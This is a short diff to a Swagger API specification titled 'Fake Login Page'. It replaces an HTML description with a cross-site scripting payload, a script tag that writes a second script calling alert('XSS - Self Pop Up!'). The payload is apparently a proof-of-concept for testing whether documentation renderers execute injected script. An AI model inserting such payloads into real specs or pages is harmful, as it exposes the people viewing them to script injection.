@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: "This is <b>bold</b> and this is <i>italic</i>. Visit <a href='https://example.com'>Example</a> for more info."
+  
+  description: "<script>document.write("<script>alert('XSS - Self Pop Up!');</script>")</script>"
   servers:
   - url: http://api.example.com/v1
     description: Optional server description, e.g. Main (production) server  
